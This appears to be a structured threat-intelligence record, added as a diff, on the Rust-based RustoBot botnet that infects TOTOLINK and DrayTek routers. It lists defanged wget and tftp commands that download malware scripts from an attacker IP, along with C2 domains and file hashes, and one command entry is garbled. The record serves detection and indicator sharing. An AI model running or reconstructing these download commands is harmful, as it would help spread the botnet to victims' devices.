@@ -1,0 +1,79 @@
+description: FortiGuard Labs discovered a new botnet, RustoBot, propagating through
+  TOTOLINK devices and exploiting vulnerabilities in DrayTek routers. The malware
+  is written in Rust and utilizes various techniques for command and control and DDoS
+  attacks.
+date: '2025-04-25'
+authors:
+- Vincent Li (FortiGuard Labs)
+attribution:
+  threat_actor: Unknown
+  APT_group: Unknown
+  country: Multiple (Japan, Taiwan, Vietnam, Mexico)
+malware_families:
+- RustoBot
+- Mirai
+TTPs:
+  processes:
+  - wget
+  - tftp
+  commandline:
+  - wget hxxp://66.63.187.69/w.sh
+  - wget hxxp://66.63.187.69/wget.sh
+  - thxxp://66.63.187.69/tftp.sh
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: wget
+    destination_address: 66.63.187.69
+    port: ''
+    url: hxxp://66.63.187.69/w.sh
+  - executable: wget
+    destination_address: 66.63.187.69
+    port: ''
+    url: hxxp://66.63.187.69/wget.sh
+  - executable: tftp
+    destination_address: 5.255.125.150
+    port: ''
+    url: ''
+  file_modifications:
+  - /path/to/rustobot/arm5
+  - /path/to/rustobot/arm6
+  - /path/to/rustobot/arm7
+  - /path/to/rustobot/mips
+  - /path/to/rustobot/mpsl
+  - /path/to/rustobot/x86
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: 76a487a46cfeb94eb5a6290ceffabb923c35befe71a1a3b7b7d67341a40bc454
+- hash: 75d031e8faaf3aa0e9cafd5ef0fd7de1a2a80aaa245a9e92bae6433a17f48385
+- hash: fbdd5cba193a5e097cd12694efe14a15eb0fc059623f82da6c0bf99cbcfa22f8
+- hash: 0dde88e9e5a0670e19c3b3e864de1b6319aaf92989739602e55b494b09873fbe
+- hash: 15c9d7a63fa419305d7f2710b63f71cc38178973c0ccf6d437ce8b6feeca4ee1
+- hash: 427399864232c6c099f183704b23bff241c7e0de642e9eec66cc56890e8a6304
+- hash: 4f0ba25183ecb79a0721037a0ff9452fa8c19448f82943deca01b36555f2cc99
+- hash: c0abb19b3a72bd2785e8b567e82300423da672a463eefdeda6dd60872ff0e072
+- hash: dae8dae748be54ba0d5785ab27b1fdf42b7e66c48ab19177d4981bcc032cfb1c
+- hash: 9f098920613bd0390d6485936256a67ae310b633124cfbf503936904e69a81bf
+- hash: e547306d6dee4b5b2b6ce3e989b9713a5c21ebe3fefa0f5c1a1ea37cec37e20f
+- hash: b910e77ee686d7d6769fab8cb8f9b17a4609c4e164bb4ed80d9717d9ddad364f
+- hash: 44a526f20c592fd95b4f7d61974c6f87701e33776b68a5d0b44ccd2fa3f48c5d
+- hash: efb0153047b08aa1876e1e4e97a082f6cb05af75479e1e9069b77d98473a11f4
+- hash: 9a9b5bdeb1f23736ceffba623c8950d627a791a0b40c4d44ae2f80e02a43955d
+- hash: 5dc90cbb0f69f283ccf52a2a79b3dfe94ee8b3474cf6474cfcbe9f66f245a55d
+- hash: b68e2d852ad157fc01da34e11aa24a5ab30845b706d7827b8119a3e648ce2cf1
+- hash: 9e660ce74e1bdb0a75293758200b03efd5f807e7896665addb684e0ffb53afd2
+- hash: ec9e77f1185f644462305184cf8afcf5d12c7eb524a2d3f4090a658a198c20ce
+- hash: 114b460012412411363c9a3ab0246e48a584ce86fc6c0b7855495ec531dd05a1
+- hash: 1697fd5230f7f09a7b43fee1a1693013ed98beeb7a182cd3f0393d93dd1b7576
+- ip: 5.255.125.150
+- domain: dvrhelper[.]anondns[.]net
+- domain: techsupport[.]anondns[.]net
+- domain: rustbot[.]anondns[.]net
+- domain: miraisucks[.]anondns[.]net
+- url: hxxp://66.63.187.69/mpsl
+reference: https://www.fortinet.com/blog/threat-research/new-rust-botnet-rustobot-is-routed-via-routers
+file_creation_date: May 14, 2025
